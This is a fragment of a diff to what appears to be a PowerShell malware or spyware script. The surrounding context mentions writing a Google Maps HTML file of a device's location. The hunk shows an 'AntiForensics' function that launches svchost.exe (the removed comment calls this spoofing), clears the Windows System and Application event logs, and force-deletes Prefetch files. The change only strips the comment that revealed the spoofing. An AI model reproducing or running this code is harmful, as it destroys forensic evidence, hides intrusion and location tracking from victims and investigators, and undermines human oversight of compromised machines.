@@ -273,7 +273,7 @@ Write-Output "Google Maps location HTML created as DeviceLocation.html"
 
 function AntiForensics {
     try {
-        $null = [Diagnostics.Process]::Start("svchost.exe", "")  # Spoof as svchost
+        $null = [Diagnostics.Process]::Start("svchost.exe", "")
         wevtutil cl System
         wevtutil cl Application
         Remove-Item "$env:SYSTEMROOT\Prefetch\*" -Force -ErrorAction SilentlyContinue
